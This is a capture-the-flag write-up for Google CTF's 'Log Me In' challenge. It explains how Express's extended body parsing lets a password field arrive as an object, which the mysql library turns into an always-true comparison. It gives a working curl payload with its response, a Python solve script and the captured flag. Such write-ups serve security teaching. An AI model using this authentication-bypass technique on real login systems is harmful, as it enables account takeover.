# Log Me In

Author: [roerohan](https://github.com/roerohan)

# Requirements

- Express.js  
- Body Parser

# Source

- https://log-me-in.web.ctfcompetition.com/

```  
Log in to get the flag  
```

```js  
/**  
* @fileoverview Description of this file.  
*/

const mysql = require('mysql');  
const express = require('express');  
const cookieSession = require('cookie-session');  
const cookieParser = require('cookie-parser');  
const bodyParser = require('body-parser');

const flagValue = "..."  
const targetUser = "michelle"

const {  
 v4: uuidv4  
} = require('uuid');

const app = express();  
app.set('view engine', 'ejs');  
app.set('strict routing', true);

/* strict routing to prevent /note/ paths etc. */  
app.set('strict routing', true)  
app.use(cookieParser());

/* secure session in cookie */  
app.use(cookieSession({  
 name: 'session',  
 keys: ['...'] //don't even bother  
}));

app.use(bodyParser.urlencoded({  
 extended: true  
}))

app.use(function(req, res, next) {  
 if(req && req.session && req.session.username) {  
   res.locals.username = req.session.username  
   res.locals.flag = req.session.flag  
 } else {  
   res.locals.username = false  
   res.locals.flag = false  
 }  
 next()  
});

/* server static files from static folder */  
app.use('/static', express.static('static'))

app.use(function( req, res, next) {  
 if(req.get('X-Forwarded-Proto') == 'http') {  
     res.redirect('https://' + req.headers.host + req.url)  
 } else {  
   if (process.env.DEV) {  
     return next()  
   } else  {  
   return next()  
   }  
 }  
});  
// MIDDLEWARE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

/* csrf middleware, csrf_token stored in the session cookie */  
const csrf = (req, res, next) => {  
 const csrf = uuidv4();  
 req.csrf = req.session.csrf || uuidv4();  
 req.session.csrf = csrf;  
 res.locals.csrf = csrf;

 nocache(res);

 if (req.method == 'POST' && req.csrf !== req.body.csrf) {  
   return res.render('index', {error: 'Invalid CSRF token'});  
 }

 next();  
}

/* disable cache on specifc endpoints */  
const nocache = (res) => {  
 res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-
revalidate');  
 res.setHeader('Pragma', 'no-cache');  
 res.setHeader('Expires', '0');  
}

/* auth middleware */  
const auth = (req, res, next) => {  
 if (!req.session || !req.session.username) {  
   return res.render('index', {error:"You must be logged in to access that"});  
 }  
 next()  
}

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`  
app.get('/logout', (req, res) => {  
 req.session = null;  
 res.redirect('/');  
});

app.get('/', csrf, (req, res) => {  
 res.render('index');  
});

app.get('/about', (req, res) => {  
 res.render('about');

});  
app.get('/me', auth, (req, res) => {  
 res.render('profile');  
});

app.get('/flag', csrf, auth, (req, res) => {  
 res.render('premium')  
});

app.get('/login', (req, res) => {  
 res.render('login');  
});

app.post('/login', (req, res) => {  
 const u = req.body['username'];  
 const p = req.body['password'];

 const con = DBCon(); // mysql.createConnection(...).connect()

 const sql = 'Select * from users where username = ? and password = ?';  
 con.query(sql, [u, p], function(err, qResult) {  
   if(err) {  
     res.render('login', {error: `Unknown error: ${err}`});  
   } else if(qResult.length) {  
     const username = qResult[0]['username'];  
     let flag;  
     if(username.toLowerCase() == targetUser) {  
       flag = flagValue  
     } else{  
       flag = "<span>Only Michelle's account has the flag</span>";  
     }  
     req.session.username = username  
     req.session.flag = flag  
     res.redirect('/me');  
   } else {  
     res.render('login', {error: "Invalid username or password"})  
   }  
 });  
});

/*  
* ...SNIP...  
*/

```

# Exploitation

When you look at the source code, you'll notice the following snippet:

```js  
app.use(bodyParser.urlencoded({  
 extended: true  
}))  
```

This tells body parser to allow arrays and objects in the request body. So you
can pass things like:

```  
username[]=a&username[]=b

This is interpreted as username = ['a', 'b']

Similarly,

username[hello]=a

Is interpreted as username = {hello: 'a'}  
```

Now, you see in the `/login` POST route that the output has not been
stringified (no `.toString()`). Which means it is possible to pass an object
in the query statement.

```js  
const sql = 'Select * from users where username = ? and password = ?';  
con.query(sql, [u, p], function(err, qResult) {...});  
```

Now, let's see if passing an objectto the `con.query` function might help us.
We'll refer to the official `mysql`
[docs](https://www.npmjs.com/package/mysql#escaping-query-values).

Take a look at this example:

```js  
var post  = {id: 1, title: 'Hello MySQL'};  
var query = connection.query('INSERT INTO posts SET ?', post, function (error,
results, fields) {  
 if (error) throw error;  
 // Neat!  
});  
console.log(query.sql); // INSERT INTO posts SET `id` = 1, `title` = 'Hello
MySQL'  
```

We can see that objects are converted into comma separated attributes. We know
that the username is supposed to be `michelle`, but we do not know the
password. So, we can try to pass an object in the place of password, with a
known attribute. Here's the payload I tried:

```  
csrf&username=michelle&password[username]=michelle  
```

This makes `password` an object as shown below:

```js  
{  
 username: 'michelle',  
}  
```

Now, the query becomes something like:

```js  
con.query('Select * from users where username = ? and password = ?',
['michelle', {username: 'michelle'}], function(err, qResult) {...});  
```

This actually evaluates to:

```js  
"Select * from users where username = 'michelle' and password = `username` =
'michelle';"  
```

This works because of the way `mysql` evaluates strings. When you evaluate
`'password' = 'username'`, it returns a 0. Then, if you compare `0` and
`'michelle'`, `true` is returned. This happens because of the way type-casting
is done in `mysql`.  
  

This exploit would work for any string (not just `michelle`) except the ones
which get type-casted to a different number.  
  

For example, `0 = '1michelle'` will evaluate to false, since `1michelle` when
converted to an integer gives `1`. Therefore, `password[username] = 1michelle`
will not allow you to log in successfully. Check out
[this](https://stackoverflow.com/questions/22080382/mysql-why-comparing-a-
string-to-0-gives-true) link for a more detailed explanation.  
  

Here's the final paylaod.

```bash  
curl -i -X POST --data 'csrf&username=michelle&password[username]=michelle'
"https://log-me-in.web.ctfcompetition.com/login"

HTTP/2 302  
content-type: text/plain; charset=utf-8  
x-powered-by: Express  
location: /me  
vary: Accept  
set-cookie:
session=eyJ1c2VybmFtZSI6Im1pY2hlbGxlIiwiZmxhZyI6IkNURnthLXByZW1pdW0tZWZmb3J0LWRlc2VydmVzLWEtcHJlbWl1bS1mbGFnfSJ9;
path=/; httponly  
set-cookie: session.sig=bm5eHrmgRjBNmerS49mKNDV_tP4; path=/; httponly  
x-cloud-trace-context: 51c2e656058a1cc31a265b3a8ad0d4b1  
date: Mon, 24 Aug 2020 06:53:43 GMT  
server: Google Frontend  
content-length: 25

Found. Redirecting to /me  
```

From here, you can just take the cookie you received, and use that to visit
`/flag`.  
  

P.S. you can write a python script for the exploit, like the one given below:

```py  
import requests  
import re

url = lambda path: 'https://log-me-in.web.ctfcompetition.com' + path

s = requests.Session()

payload = {  
   "username": "michelle",  
   "password[username]": "michelle",  
   "csrf": "",  
}

r = s.post(url('/login'), data=payload)

r = s.get(url('/flag'))

if re.search(r'CTF{.*}', r.text):  
   print(r.text)

```

You can run this script and use `grep` to find the flag.

```bash  
$ python solve.py | grep CTF  

Flag: CTF{a-premium-effort-deserves-a-premium-flag}

  
```

The flag is:

```  
CTF{a-premium-effort-deserves-a-premium-flag}  
```  

Original writeup (https://github.com/csivitu/CTF-Write-
ups/tree/master/Google%20CTF/Web/Log-Me-In).